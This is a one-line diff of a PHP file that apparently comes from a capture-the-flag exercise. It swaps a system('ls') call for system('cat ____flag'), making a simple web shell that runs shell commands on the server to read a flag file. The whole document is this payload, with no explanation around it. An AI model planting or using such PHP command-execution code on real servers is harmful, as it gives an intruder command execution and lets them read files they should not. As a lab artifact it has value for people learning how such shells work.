@@ -1,1 +1,1 @@
-<?php echo system("ls"); ?>
+<?php echo system("cat ____flag"); ?>
